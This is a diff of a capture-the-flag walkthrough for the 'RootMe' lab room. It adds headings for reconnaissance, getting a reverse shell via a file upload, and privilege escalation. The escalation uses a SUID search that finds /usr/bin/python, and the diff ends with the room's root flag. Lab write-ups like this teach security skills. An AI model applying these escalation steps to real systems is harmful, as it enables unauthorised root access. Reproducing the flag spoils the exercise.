@@ -1,8 +1,12 @@
 ### RootMe
 
+
+#### Deploy the machine
+
 export IP: 10.10.43.146
 
 
+#### Reconnaissance
 Scan the machine, how many ports are open?
 
 - port 44442 is not included since status is filtered
@@ -84,6 +88,7 @@ Progress: 5864 / 220561 (2.66%)                                                 
 
 ```
 
+#### Getting a shell
 
 Find a form to upload and get a reverse shell, and find the flag.
 
@@ -155,10 +160,27 @@ www-data@rootme:/$ ^C
 
 ```
 
+#### Privilege escalation
+
+- Using the lectures from beginner path, SUID part, we can check for SUID using the following command:
+
+```
+www-data@rootme:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+===OMMITED====
+-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
+-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
+
+```
+
+
+Search for files with SUID permission, which file is weird?
+
+/usr/bin/python
+
 Find a form to escalate your privileges.
-
-- Using the lectures from beginner path, SUID part, we can check for SUID 
-
 
 Tried using shell on GTFObins, but to no luck:
 
@@ -188,7 +210,7 @@ root
 
 ```
 
-
+look for the flag then complete the room:
 
 ```
 # cat root.txt
@@ -197,3 +219,5 @@ THM{pr1v1l3g3_3sc4l4t10n}
 
 
 ```
+
+END
